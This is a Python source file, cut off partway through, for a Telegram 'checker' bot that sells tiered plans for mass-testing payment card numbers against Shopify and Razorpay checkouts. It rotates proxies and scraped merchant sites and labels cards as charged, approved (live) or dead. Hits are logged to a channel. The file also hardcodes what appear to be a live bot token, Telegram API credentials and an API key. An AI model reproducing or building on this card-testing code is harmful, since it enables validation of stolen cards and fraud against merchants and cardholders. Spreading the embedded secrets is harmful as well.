from telethon import TelegramClient, events, Button
from telethon.errors import UserNotParticipantError, FloodWaitError
from telethon.tl.functions.channels import GetParticipantRequest
import telethon.tl.types
import asyncio
import aiohttp
import aiofiles
import os
import sys
import random
import time
import json
import re
import string
from urllib.parse import urlparse, quote
from datetime import datetime, timedelta


def _ensure_data_files():
    """Ensure all required data files exist in /app/data on startup."""
    import os
    data_dir = '/app/data'
    os.makedirs(data_dir, exist_ok=True)

    files_to_create = {
        'users.json': '{}',
        'codes.json': '{}',
        'banned_users.json': '{}',
        'sites.txt': '',
        'proxies.txt': '',
        'premium_users.txt': '',
        'verified_users.txt': '',
    }

    for filename, default_content in files_to_create.items():
        filepath = os.path.join(data_dir, filename)
        if not os.path.exists(filepath):
            with open(filepath, 'w') as f:
                f.write(default_content)
            print(f"✅ Created {filename}")

# Call this at module load time (before bot starts)
_ensure_data_files()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = '/app/data'  # Persistent volume mount

API_ID = int(os.getenv('API_ID', '39027759'))
API_HASH = os.getenv('API_HASH', 'ea20df34f5f44c21c493eff664559ba3')
BOT_TOKEN = os.getenv('BOT_TOKEN', '8634285605:AAHcQ5_ybod_DgpNyF5HD9JC_m7qiRr4MLo')
ADMIN_ID = [8456043064]

# ─── SINGLE INSTANCE LOCK ────────────────────────────────────────────────────
# Prevents double responses caused by running two bot processes at the same time.
PID_FILE = os.path.join('/tmp', 'bot.pid')  # FIX #6: /tmp is always writable in Docker/Railway

def _acquire_single_instance():
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE, 'r') as f:
                old_pid = int(f.read().strip())
            os.kill(old_pid, 0)  # raises ProcessLookupError if gone
            # PID exists — but verify it's actually our bot process.
            # In containers (Pterodactyl), PIDs recycle quickly after a crash,
            # so PID N might now belong to a completely unrelated process.
            is_same_bot = False
            try:
                with open(f'/proc/{old_pid}/cmdline', 'r') as f:
                    cmdline = f.read().replace('\x00', ' ')
                lower_cmdline = cmdline.lower()
                is_same_bot = ('bot.py' in lower_cmdline) or ('checker_bot' in lower_cmdline and 'python' in lower_cmdline)
            except Exception:
                is_same_bot = True  # can't verify — assume it's ours to be safe
            if is_same_bot:
                print(f"❌ Bot is already running (PID {old_pid}). "
                      f"Kill it first: kill {old_pid}")
                sys.exit(1)
            else:
                # Stale PID file pointing at a recycled PID — safe to overwrite
                print(f"[info] Stale bot.pid (PID {old_pid} is now a different process). Overwriting.")
        except (ProcessLookupError, ValueError, OSError):
            pass  # process is gone — stale PID file, safe to overwrite

    with open(PID_FILE, 'w') as f:
        f.write(str(os.getpid()))

    import atexit
    def _cleanup():
        try:
            os.remove(PID_FILE)
        except OSError:
            pass
    atexit.register(_cleanup)

_acquire_single_instance()
# ─────────────────────────────────────────────────────────────────────────────
CHECKER_API_URL       = os.getenv('CHECKER_API_URL', 'https://autosh.up.railway.app/shopii')
SITE_TEST_URL         = os.getenv('SITE_TEST_URL', 'https://autosh.up.railway.app/shopii')
SHOPIFY_API_KEY       = os.getenv('SHOPIFY_API_KEY', 'afuona_2026')
RAZORPAY_API_URL      = os.getenv('RAZORPAY_API_URL', 'https://notfrrx-razorpay.up.railway.app/rz')
RAZORPAY_MERCHANT_URL = os.getenv('RAZORPAY_MERCHANT_URL', 'https://razorpay.me/@mstechnomedia')

PREMIUM_USERS_FILE = os.path.join(DATA_DIR, 'premium_users.txt')
SITES_FILE = os.path.join(DATA_DIR, 'sites.txt')
PROXY_FILE = os.path.join(DATA_DIR, 'proxies.txt')
CODES_FILE = os.path.join(DATA_DIR, 'codes.json')
USERS_FILE   = os.path.join(DATA_DIR, 'users.json')
BANNED_FILE  = os.path.join(DATA_DIR, 'banned_users.json')
GROUP_LINK  = 'https://t.me/+td8TrhA9ctY3NTc0'

PLANS = {
    'FREE':     {'price': 'Free', 'days': 30,  'cc_limit': 100,  'emoji': '🆓', 'group_only': True},
    'BASIC':    {'price': '$1',   'days': 1,   'cc_limit': 500,  'emoji': '🥉', 'group_only': False},
    'STANDARD': {'price': '$2',   'days': 5,   'cc_limit': 1000, 'emoji': '🥈', 'group_only': False},
    'PREMIUM':  {'price': '$7',   'days': 15,  'cc_limit': 2000, 'emoji': '🥇', 'group_only': False},
    'VIP':      {'price': '$15',  'days': 30,  'cc_limit': 5000, 'emoji': '👑', 'group_only': False},
}

# ── Plan-based concurrency limits for /chk (sequential + parallel) ──
PLAN_CONCURRENCY = {
    'FREE':     20,
    'BASIC':    30,
    'STANDARD': 40,
    'PREMIUM':  60,
    'VIP':      80,
    'ADMIN':   100,
}

def get_user_concurrency(user_id: int) -> int:
    """Get max concurrent workers for a user based on their plan."""
    if user_id in ADMIN_ID:
        return PLAN_CONCURRENCY['ADMIN']
    users = load_users_data()
    uid = str(user_id)
    user_plan = users.get(uid, {}).get('plan', 'FREE')
    return PLAN_CONCURRENCY.get(user_plan, PLAN_CONCURRENCY['FREE'])

# FIX #7: Session file in DATA_DIR for persistence across container restarts
bot = TelegramClient(os.path.join(DATA_DIR, 'checker_bot'), API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_sessions = {}
pending_addsites  = {}   # user_id -> {sites, proxies, msg_id}
pending_sitecheck = {}   # user_id -> {sites, proxies, msg_id}

# ─── SHARED HTTP SESSION (avoids per-request session overhead) ─────────────────
_http_session = None

def _shared_http_session():
    """Returns a shared aiohttp session; creates one if needed.
    Note: not fully thread-safe but safe for single-event-loop use."""
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(
            limit=300,
            ttl_dns_cache=300,
            force_close=False,
            enable_cleanup_closed=True  # prevents ResourceWarning on stale connections
        )
        _http_session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=200)  # global fallback timeout
        )
    return _http_session


# ═══════════════════════════════════════════════════════════════════════════════
# BOT-SIDE TRAFFIC MANAGEMENT (prevents API overload from multiple users)
# ═══════════════════════════════════════════════════════════════════════════════
# Layer 1: Global Semaphore — hard cap on total concurrent API calls
# Layer 2: Auto Per-User Cap — dynamic worker allocation based on active users
# Layer 3: Response Time Monitoring — adaptive worker count
# Layer 4: Smart Batching — batch multiple cards per API call

# ── Layer 1: Global Semaphore ────────────────────────────────────────────────
# Hard limit: max 30 concurrent API calls across ALL users combined.
# Prevents API overload regardless of how many users are checking simultaneously.
_GLOBAL_MAX_CONCURRENT = int(os.getenv('BOT_GLOBAL_CONCURRENT', '100'))
# FIX #4/#9: Lazily init semaphores on first use to avoid module-level event-loop binding.
# Telethon's bot.run_until_disconnected() creates its own asyncio loop; semaphores
# created before that loop runs would be bound to the wrong (or no) loop in Python ≥3.10.
_global_api_semaphore: asyncio.Semaphore = None  # type: ignore[assignment]

# ── Dedicated semaphore for site/proxy checking (separate from card API) ──
# Does NOT compete with /chk or /mrz card-checking slots.
_SITE_CHECK_MAX = int(os.getenv('BOT_SITE_CONCURRENT', '20'))
_site_check_semaphore: asyncio.Semaphore = None  # type: ignore[assignment]

def _get_global_semaphore() -> asyncio.Semaphore:
    """Lazily create the global API semaphore on the running event loop (FIX #4)."""
    global _global_api_semaphore
    if _global_api_semaphore is None:
        _global_api_semaphore = asyncio.Semaphore(_GLOBAL_MAX_CONCURRENT)
    return _global_api_semaphore

def _get_site_semaphore() -> asyncio.Semaphore:
    """Lazily create the site-check semaphore on the running event loop (FIX #9)."""
    global _site_check_semaphore
    if _site_check_semaphore is None:
        _site_check_semaphore = asyncio.Semaphore(_SITE_CHECK_MAX)
    return _site_check_semaphore

# ── Layer 2: Auto Per-User Cap ───────────────────────────────────────────────
# Dynamically allocates workers per user based on how many users are active.
# 1 user = 25 workers, 2 users = 12 each, 3 users = 10 each, etc.
_MAX_WORKERS_SOLO = 25          # max workers when only 1 user checking
_MIN_WORKERS_PER_USER = 5       # minimum workers per user even under heavy load
_active_mass_users = set()      # set of user_ids currently running /chk
# FIX #4 (also): lazy-init user lock
_user_lock: asyncio.Lock = None  # type: ignore[assignment]

def _get_user_lock() -> asyncio.Lock:
    global _user_lock
    if _user_lock is None:
        _user_lock = asyncio.Lock()
    return _user_lock
# FIX #10: lazy-init redeem lock to avoid module-level event-loop binding
_redeem_lock: asyncio.Lock = None  # type: ignore[assignment]

def _get_redeem_lock() -> asyncio.Lock:
    """Lazily create the redeem lock on the running event loop (FIX #10)."""
    global _redeem_lock
    if _redeem_lock is None:
        _redeem_lock = asyncio.Lock()
    return _redeem_lock


async def register_mass_user(user_id: int):
    """Register a user as actively running mass check."""
    async with _get_user_lock():
        _active_mass_users.add(user_id)


async def unregister_mass_user(user_id: int):
    """Unregister a user when mass check completes."""
    async with _get_user_lock():
        _active_mass_users.discard(user_id)


def get_per_user_workers() -> int:
    """Calculate how many workers each user should get based on active user count."""
    active_count = max(1, len(_active_mass_users))
    # Fair division of global limit, but capped at solo max
    per_user = min(_MAX_WORKERS_SOLO, max(_MIN_WORKERS_PER_USER, _GLOBAL_MAX_CONCURRENT // active_count))
    return per_user


# ── Layer 3: Bot-Side Response Time Monitoring ───────────────────────────────
# Tracks API response times and dynamically adjusts worker count.
# If responses are fast → allow more workers. If slow → reduce workers.
from collections import deque as _deque

_response_time_window = _deque(maxlen=30)  # last 30 response times
_adaptive_worker_multiplier = 1.0  # 1.0 = normal, 0.5 = half workers, 1.5 = more


def record_bot_response_time(duration: float):
    """Record how long an API call took."""
    _response_time_window.append(duration)


def get_adaptive_multiplier() -> float:
    """Calculate worker multiplier based on recent response times."""
    global _adaptive_worker_multiplier
    if len(_response_time_window) < 5:
        return 1.0
    avg_rt = sum(_response_time_window) / len(_response_time_window)
    if avg_rt < 8.0:
        # Responses fast — increase throughput
        _adaptive_worker_multiplier = min(1.5, _adaptive_worker_multiplier + 0.1)
    elif avg_rt > 15.0:
        # Responses slow — reduce load
        _adaptive_worker_multiplier = max(0.4, _adaptive_worker_multiplier - 0.15)
    elif avg_rt > 12.0:
        # Slightly slow — small reduction
        _adaptive_worker_multiplier = max(0.6, _adaptive_worker_multiplier - 0.05)
    else:
        # Normal range — drift toward 1.0
        _adaptive_worker_multiplier = _adaptive_worker_multiplier * 0.95 + 1.0 * 0.05
    return _adaptive_worker_multiplier


def get_effective_workers() -> int:
    """Get the final worker count after all adjustments."""
    base = get_per_user_workers()
    multiplier = get_adaptive_multiplier()
    effective = max(_MIN_WORKERS_PER_USER, int(base * multiplier))
    return effective


# ── Layer 4: Smart Batching ──────────────────────────────────────────────────
# Instead of 1 card = 1 API call, batch up to N cards in a single request.
# The API needs a /batch endpoint for this to work. For now, we batch at
# the bot level by reusing the connection and sending cards in quick succession
# with minimal gap (connection reuse via shared aiohttp session).
_BATCH_SIZE = int(os.getenv('BOT_BATCH_SIZE', '5'))  # cards to send in rapid burst


async def check_cards_batch(cards: list, sites: list, proxies: list, lane="mass", uid="anonymous"):
    """Check multiple cards in rapid succession using shared connection.
    
    Uses global semaphore to limit total concurrent calls, and fires
    cards in quick succession to benefit from HTTP keep-alive.
    """
    results = []
    tasks = []
    for card in cards:
        site = random.choice(sites)
        proxy = random.choice(proxies)
        tasks.append(_checked_api_call(card, site, proxy, lane, uid))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    final = []
    for i, r in enumerate(results):
        if isinstance(r, Exception):
            final.append({'status': 'Dead', 'message': f'Error: {str(r)}', 'card': cards[i], 'gateway': '-', 'price': '-'})
        else:
            final.append(r)
    return final


async def _checked_api_call(card, site, proxy, lane, uid):
    """Single API call wrapped with global semaphore + response time tracking."""
    async with _get_global_semaphore():
        # FIX #1: Timer starts INSIDE semaphore — measures actual API latency, not queue wait
        _start = time.time()
        result = await check_card(card, site, proxy, lane=lane, uid=uid)
        _elapsed = time.time() - _start
    record_bot_response_time(_elapsed)
    return result


# ═══════════════════════════════════════════════════════════════════════════════
# END BOT-SIDE TRAFFIC MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════════

# ── Response normalization map (long Shopify codes → clean short names) ──────
# ── API Response Categories ──────────────────────────────────────────────────
# CHARGED   : order_placed, charged, order_paid
# APPROVED  : incorrect_zip, invalid_cvc, invalid_cvv, insufficient_funds, otp_required
# DECLINED  : card_declined, fraud, do_not_honor, incorrect_number, card_incorrect,
#             expired_card, pickup_card, restricted_card, stolen_card, lost_card,
#             card_velocity_exceeded, transaction_not_allowed, invalid_expiry,
#             processing_error, call_issuer, try_again_later, fraudulent,
#             security_violation, blocked, bad_cvv, cvv_fail, authentication_required,
#             mismatched_bill, declined, approved, wrong_number, incorrect number,
#             card incorrect
# ─────────────────────────────────────────────────────────────────────────────
_RESPONSE_DISPLAY_MAP = {
    # Full BASE_ variants → clean short names
    'PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS': 'INSUFFICIENT_FUNDS',
    'PAYMENTS_CREDIT_CARD_BASE_INVALID_CVC':        'INVALID_CVC',
    'PAYMENTS_CREDIT_CARD_BASE_INCORRECT_CVC':      'INCORRECT_CVC',
    'PAYMENTS_CREDIT_CARD_BASE_OTP_REQUIRED':       'OTP_REQUIRED',
    'PAYMENTS_CREDIT_CARD_BASE_3DS_REQUIRED':       '3DS_REQUIRED',
    'PAYMENTS_CREDIT_CARD_BASE_EXPIRED':            'EXPIRED_CARD',
    'PAYMENTS_CREDIT_CARD_BASE_GENERIC_DECLINE':    'CARD_DECLINED',
    'PAYMENTS_CREDIT_CARD_BASE_DO_NOT_HONOR':       'DO_NOT_HONOR',
    'PAYMENTS_CREDIT_CARD_BASE_STOLEN_CARD':        'STOLEN_CARD',
    'PAYMENTS_CREDIT_CARD_BASE_LOST_CARD':          'LOST_CARD',
    'PAYMENTS_CREDIT_CARD_BASE_FRAUDULENT':         'FRAUDULENT',
    'PAYMENTS_CREDIT_CARD_BASE_INVALID_NUMBER':     'INCORRECT_NUMBER',
    'PAYMENTS_CREDIT_CARD_BASE_INVALID_EXPIRY':     'EXPIRED_CARD',
    # Display aliases
    'CARD_CHARGED':     'ORDER_PLACED',
    'CHARGED':          'ORDER_PLACED',
    'ORDER_PAID':       'ORDER_PLACED',   # ORDER_PAID → charged category
    # Normalize space variants
    'CARD DECLINED':    'CARD_DECLINED',
    'DO NOT HONOR':     'DO_NOT_HONOR',
    'INCORRECT NUMBER': 'INCORRECT_NUMBER',
    'WRONG NUMBER':     'WRONG_NUMBER',
    'CARD INCORRECT':   'CARD_INCORRECT',
    # FIX: Additional common API responses
    'CARD_APPROVED':    'CARD_APPROVED',
    'APPROVED':         'INSUFFICIENT_FUNDS',   # treat raw APPROVED as soft decline (live card)
}


# ── Site-alive indicator keywords ─────────────────────────────────────────────
# If API response_msg matches ANY of these, the site successfully processed
# the card (site IS alive) — even if the card itself was declined.
# Opposite of DEAD_KEYWORDS: these are card-level errors, NOT site-level errors.
# Examples: CARD_DECLINED → site alive; GENERIC_ERROR → site dead.
_SITE_ALIVE_RESPONSES = {
    # Charged / placed
    'ORDER_PLACED', 'CHARGED', 'CARD_CHARGED', 'ORDER_PAID',
    # Card declines (site processed the card → alive)
    'CARD_DECLINED', 'DECLINED',
    'DO_NOT_HONOR', 'DO NOT HONOR',
    'INSUFFICIENT_FUNDS', 'INSUFFICIENT_FUND',
    'INCORRECT_CVC', 'INVALID_CVC',
    'INCORRECT_CVV', 'INVALID_CVV', 'BAD_CVV', 'CVV_FAIL',
    'INCORRECT_ZIP',
    'INCORRECT_NUMBER', 'WRONG_NUMBER', 'CARD_INCORRECT', 'CARD INCORRECT',
    'EXPIRED_CARD', 'INVALID_EXPIRY',
    'FRAUD', 'FRAUDULENT',
    'STOLEN_CARD', 'LOST_CARD', 'PICKUP_CARD',
    'RESTRICTED_CARD', 'CARD_VELOCITY_EXCEEDED',
    'TRANSACTION_NOT_ALLOWED', 'PROCESSING_ERROR',
    'CALL_ISSUER', 'TRY_AGAIN_LATER',
    'AUTHENTICATION_REQUIRED', 'SECURITY_VIOLATION',
    'BLOCKED', 'MISMATCHED_BILL',
    '3DS_REQUIRED', 'OTP_REQUIRED', 'OTP REQUIRED',
    # Soft declines (card is live, just soft-declined)
    'CARD_APPROVED',
    # Generic payment errors — site is alive, card just failed
    'GENERIC_ERROR', 'PAYMENTS_CREDIT_CARD_GENERIC',
}
# ─────────────────────────────────────────────────────────────────────────────

def _display_message(msg):
    """Normalize API response codes to clean short names for bot display."""
    s = str(msg).strip().upper()
    # Direct map lookup (fastest path)
    if s in _RESPONSE_DISPLAY_MAP:
        return _RESPONSE_DISPLAY_MAP[s]
    # Fallback: return original (preserving original case for human-readable messages)
    return str(msg)
# ──────────────────────────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────────────────────────
# DEAD KEYWORDS — if API response contains any of these, site is DEAD
# ─────────────────────────────────────────────────────────────────────────────
DEAD_KEYWORDS = [
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    'http 502', 'http 503', 'http 504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'site error',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    # GENERIC_ERROR removed — card-level error, site IS alive
    'delivery_no_delivery_strategy_available_for_merchandise_line',
    'no_variants', 'rate_limited',
    'merchandise_product_not_published_in_buyer_location',
    'merchandise_out_of_stock', 'faild_to_add_to_cart', 'waiting_pending_terms',
    'payments_credit_card_number_invalid_format', 'merchandise_expected_price_mismatch',
    'status: 429', 'http 429', 'site not supported',
    'Failed to get session token',
]

def _is_dead_keyword(response_msg: str) -> bool:
    """Returns True if the response contains any dead keyword (case-insensitive).
    For pure-numeric keywords (e.g. '429'), requires a non-digit boundary
    to avoid false matches inside card numbers or other numeric data.
    """
    low = str(response_msg).lower().strip()
    for kw in DEAD_KEYWORDS:
        kw_low = kw.lower()
        if kw_low.isdigit():
            # Only match if surrounded by non-digit chars (word boundary for numbers)
            if re.search(r'(?<![\d])' + re.escape(kw_low) + r'(?![\d])', low):
                return True
        else:
            if kw_low in low:
                return True
    return False



# One check at a time per user (prevents server overload from multiple parallel mass checks)
user_active_check = {}   # user_id -> {'type': 'chk' or 'mrz', 'session_key': str, 'chat_id': int, 'msg_id': int}

# For site checking stop functionality
current_site_check = {
    'tasks': [],
    'stopped': False,
    'owner_id': None,
    'chat_id': None,
    'msg_id': None,
}

current_addsites_check = {
    'tasks': [],
    'stopped': False,
    'owner_id': None,
    'chat_id': None,
    'msg_id': None,
}

# For proxy checking stop functionality
current_proxy_check = {
    'tasks': [],           # list of asyncio tasks (was 'task' — key bug fixed)
    'alive_proxies': [],
    'dead_proxies': [],
    'status_msg': None,
    'new_proxies': [],
    'stopped': False,
    'owner_id': None,      # security: only owner can stop
    'mode': 'add',         # 'add' = /addproxy (append), 'check' = /proxy (overwrite)
}

# For razorpay proxy checking stop functionality
current_rzpxy_check = {
    'tasks': [],
    'alive_proxies': [],
    'dead_proxies': [],
    'status_msg': None,
    'new_proxies': [],
    'stopped': False,
    'owner_id': None,
}

# ================== HIT LOG CHANNEL (NEW FEATURE) ==================
# Jab bhi kisi user ko Charged ya Approved hit mile, yahan log jayega
HIT_LOG_CHANNEL = -1003723956550

# ================== CHANNEL JOIN VERIFICATION ==================
VERIFIED_USERS_FILE = os.path.join(DATA_DIR, 'verified_users.txt')

# In-memory cache — avoids disk read on every /start message
_verified_users_cache: set = None

def _load_verified_cache():
    global _verified_users_cache
    if _verified_users_cache is not None:
        return
    _verified_users_cache = set()
    if not os.path.exists(VERIFIED_USERS_FILE):
        return
    try:
        with open(VERIFIED_USERS_FILE, 'r') as f:
            for line in f:
                uid = line.strip()
                if uid:
                    _verified_users_cache.add(uid)
    except Exception:
        pass

def is_user_verified(user_id):
    _load_verified_cache()
    return str(user_id) in _verified_users_cache

def mark_user_verified(user_id):
    _load_verified_cache()
    uid = str(user_id)
    if uid in _verified_users_cache:
        return  # already verified — no duplicate file writes
    _verified_users_cache.add(uid)
    try:
        with open(VERIFIED_USERS_FILE, 'a') as f:
            f.write(f"{uid}\n")
    except Exception:
        pass

# Channel links
LOGS_CHANNEL = "https://t.me/AyanoXLogs"
CHECKING_CHANNEL = "https://t.me/AyanoXChk"
UPDATES_CHANNEL = "https://t.me/AyanoXUpdates"


PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5444860552310457690", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "5444931419270839381", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5364052602357044385", "⭐": "5343636681473935403",
    "🆓": "5406756500108501710", "👑": "5303547611351902889", "🔍": "5258396243666681152",
    "⏱️": "5303243514782443814", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5116575178012235794", "🔄": "5454245266305604993",
    "🏦": "5303159080020372094", "🥰": "5881784744949062058", "😱": "5868517294618975202",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5454074580010295588",
    "👥": "5454371323595744068", "🥕": "5116599934203724812", "🌳": "5305346287820895195",
    "🦉": "5123344136665039833", "🍑": "5258121851091043775", "💪": "5305622454218024328",
    "🌝": "5404494035891023578", "📁": "5447408120752013199", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5283232570660634549",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5305618829265628111",
    "📌": "5447187153274567373", "💸": "5447579253723918909",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "📸": "5445344161333015312",
    "💬": "5447510826304959724", "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📹": "5445158077579952110", "📡": "5447448489149625830",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
    "🆕": "5382357040008021292",
    "📂": "5447282724886839705",
    "🤖": "5355051922862653659",
    "🏅": "5444931419270839381",
    "🎟️": "6244381874240624709",
    "♻️": "5363999757079429238",
    "📥": "5443127283898405358",
    "🏠": "6222046012781889256",
    "🥉": "5453902265922376865",
    "🥈": "5447203607294265305",
    "🥇": "5444931419270839381",
}

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

def price_in_range(raw_price, min_p, max_p):
    """Return True if raw_price falls inside [min_p, max_p].
    Handles: '$5.99', 'USD 5.99', '5,99' (EU decimal), '$1,500' (thousands sep).
    If no filter (min_p=0, max_p=0): accepts any price >= $1.
    If price is '-' or unparseable with no filter: still accepted (site alive confirmed by response).
    """
    # No filter — accept any alive site regardless of price
    if min_p == 0 and max_p == 0:
        if str(raw_price).strip() in ('-', '$-', '', 'None', 'null'):
            return True  # price unknown but site is alive (no filter mode)
        try:
            clean = re.sub(r'[^\d.,]', '', str(raw_price))
            if not clean:
                return True
            if re.match(r'^\d{1,3}(?:,\d{3})+(?:\.\d+)?$', clean):
                clean = clean.replace(',', '')
            elif ',' in clean and '.' not in clean:
                clean = clean.replace(',', '.')
            val = float(clean)
            return val >= 1.0
        except (ValueError, TypeError):
            return True  # unparseable in no-filter mode → keep alive site

    # Price filter mode — need a real price
    try:
        clean = re.sub(r'[^\d.,]', '', str(raw_price))
        if not clean:
            return False
        # Thousands format: 1,500 or 1,500.00 → 1500
        if re.match(r'^\d{1,3}(?:,\d{3})+(?:\.\d+)?$', clean):
            clean = clean.replace(',', '')
        elif ',' in clean and '.' not in clean:
            clean = clean.replace(',', '.')  # European: 5,99 → 5.99
        val = float(clean)
        
        # Enforce minimum 1$ requirement
        if val < 1.0:
            return False
            
        return min_p <= val <= max_p
    except (ValueError, TypeError):
        return False

def make_progress_bar(checked, total, length=16):
    if total <= 0:
        return "░" * length + " 0%"
    filled = int((checked / max(total, 1)) * length)
    bar = "█" * filled + "░" * (length - filled)
    pct = int((checked / total) * 100)
    return f"{bar} {pct}%"

async def safe_edit(msg, text, parse_mode='html', buttons=None):
    """Safely edit a message, handling FloodWaitError by sleeping."""
    if msg is None:
        return
    try:
        if buttons is not None:
            await msg.edit(premium_emoji(text), parse_mode=parse_mode, buttons=buttons)
        else:
            await msg.edit(premium_emoji(text), parse_mode=parse_mode)
    except FloodWaitError as fw:
        if fw.seconds > 60:
            print(f"[FloodWait] {fw.seconds}s > 60s, skipping retry edit")
            return
        print(f"[FloodWait] Sleeping {fw.seconds}s before retry edit")
        await asyncio.sleep(fw.seconds + 2)
        try:
            if buttons is not None:
                await msg.edit(premium_emoji(text), parse_mode=parse_mode, buttons=buttons)
            else:
                await msg.edit(premium_emoji(text), parse_mode=parse_mode)
        except Exception as e2:
            print(f"[safe_edit retry] {e2}")
    except Exception as e:
        if "MESSAGE_NOT_MODIFIED" not in str(e).upper() and "MESSAGE_ID_INVALID" not in str(e).upper():
            print(f"[safe_edit] {type(e).__name__}: {e}")


async def safe_bot_edit(chat_id, message_id, text, parse_mode='html', buttons=None):
    """Safely edit via bot.edit_message, handling FloodWaitError."""
    try:
        if buttons is not None:
            await bot.edit_message(chat_id, message_id, premium_emoji(text), buttons=buttons, parse_mode=parse_mode)
        else:
            await bot.edit_message(chat_id, message_id, premium_emoji(text), parse_mode=parse_mode)
    except FloodWaitError as fw:
        if fw.seconds > 60:
            print(f"[FloodWait] {fw.seconds}s > 60s, skipping retry bot_edit")
            return
        print(f"[FloodWait] Sleeping {fw.seconds}s before retry bot_edit")
        await asyncio.sleep(fw.seconds + 2)
        try:
            if buttons is not None:
                await bot.edit_message(chat_id, message_id, premium_emoji(text), buttons=buttons, parse_mode=parse_mode)
            else:
                await bot.edit_message(chat_id, message_id, premium_emoji(text), parse_mode=parse_mode)
        except Exception:
            pass
    except Exception as e:
        if "MESSAGE_NOT_MODIFIED" not in str(e).upper() and "MESSAGE_ID_INVALID" not in str(e).upper():
            print(f"[safe_bot_edit] {type(e).__name__}: {e}")


def get_main_menu_keyboard(user_id=None, is_free=False):
    if is_free:
        buttons = [
            [Button.inline("Cmd", b"show_cmds", style="success"),
             Button.url("Channel", GROUP_LINK, style="success")],
            [Button.url("Upgrade", "https://t.me/AYANOOXD", style="success")],
        ]
    else:
        buttons = [
            [Button.inline("Cmd", b"show_cmds", style="success"),
             Button.url("Channel", "https://t.me/+l1VlV3yldXczOWI0", style="success")],
            [Button.url("Upgrade", "https://t.me/AYANOOXD", style="success")],
        ]

    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline("Admin Panel", b"admin_panel", style="success")])

    return buttons


def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []


def normalize_proxy_input(proxy: str) -> str:
    """Normalize proxy formats for storage/testing.
    Supports:
    - ip:port
    - ip:port:user:pass
    - http://ip:port
    - http://user:pass@ip:port
    - https://ip:port
    - https://user:pass@ip:port
    - socks5://ip:port
    - socks5://user:pass@ip:port
    Also handles already-normalized forms like http://ip:port:user:pass
    """
    proxy = (proxy or '').strip().replace(' ', '')
    if not proxy:
        return ''

    if '://' in proxy:
        scheme_part, rest = proxy.split('://', 1)
        scheme = scheme_part.lower()

        # Handle already-normalized form: scheme://host:port:user:pass
        # urlparse fails on this because port parsing breaks on extra colons
        if '@' not in rest:
            rest_parts = rest.split(':')
            if len(rest_parts) == 4:
                host, port_str, user, password = rest_parts
                try:
                    int(port_str)
                    return f"{scheme}://{host}:{port_str}:{user}:{password}"
                except ValueError:
                    pass
            elif len(rest_parts) == 2:
                host, port_str = rest_parts
                try:
                    int(port_str)
                    return f"{scheme}://{host}:{port_str}"
                except ValueError:
                    pass

        try:
            parsed = urlparse(proxy)
            host = parsed.hostname or ''
            port = parsed.port
            user = parsed.username
            password = parsed.password
            if not host or not port:
                return ''
            if user is not None and password is not None:
                return f"{scheme}://{host}:{port}:{user}:{password}"
            return f"{scheme}://{host}:{port}"
        except Exception:
            return ''

    return proxy


def build_proxy_url(proxy: str) -> str | None:
    """Convert stored proxy input to aiohttp-compatible proxy URL.

    Normalized forms coming in:
      - ip:port
      - ip:port:user:pass
      - scheme://host:port          (no auth)
      - scheme://host:port:user:pass (our normalized auth form — NOT standard URL)

    Always outputs: http://user:pass@host:port  or  http://host:port
    """
    proxy = normalize_proxy_input(proxy)
    if not proxy:
        return None

    if '://' in proxy:
        _, rest = proxy.split('://', 1)

        # Our normalized auth form: host:port:user:pass (NO @ sign)
        if '@' not in rest:
            parts = rest.split(':')
            if len(parts) == 4:
                host, port_str, user, password = parts
                try:
                    int(port_str)
                    user_q = quote(user, safe='')
